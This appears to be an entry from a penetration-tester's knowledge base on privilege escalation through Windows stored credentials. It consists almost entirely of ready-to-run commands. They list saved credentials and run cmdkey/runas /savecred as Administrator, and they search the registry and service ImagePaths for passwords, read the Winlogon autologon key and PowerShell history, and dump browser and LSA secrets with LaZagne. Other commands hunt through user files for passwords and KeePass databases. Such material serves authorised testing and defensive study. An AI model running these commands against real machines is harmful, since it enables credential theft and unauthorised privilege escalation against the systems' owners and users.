---
id: windows-stored-creds
title: Windows Stored Credentials
stage: privesc
tags: [windows]
tools:
  - cmdkey /list
  - "reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  - lazagne.exe all
leads_to:
  - winrm
  - pass-the-hash
  - system-shell
---

## Saved Credentials (cmdkey)

```cmd
cmdkey /list
runas /savecred /user:Administrator cmd.exe
```

## Registry

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Service ImagePath with Embedded Credentials

```powershell
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | ForEach-Object { $_.GetValue("ImagePath") } | Where-Object { $_ } | Select-String -Pattern "\-u |\-p |\-pass|password" -CaseSensitive:$false
```

## PowerShell History

```powershell
(Get-PSReadlineOption).HistorySavePath
Get-History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## LaZagne

```powershell
.\lazagne.exe all
.\lazagne.exe browsers   # Chrome, Firefox, IE saved passwords
.\lazagne.exe windows    # Credential manager, LSA secrets
```

## Configuration Files

```powershell
# Look for plaintext in files
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue `
  | Select-String -Pattern "pass|cred|key" -SimpleMatch

# KeePass databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# IIS web config
type C:\inetpub\wwwroot\web.config 2>nul
```

## Notes

Autologon credentials in the Winlogon registry key are often plaintext and frequently reused for domain accounts. LaZagne is extremely effective against developer machines.
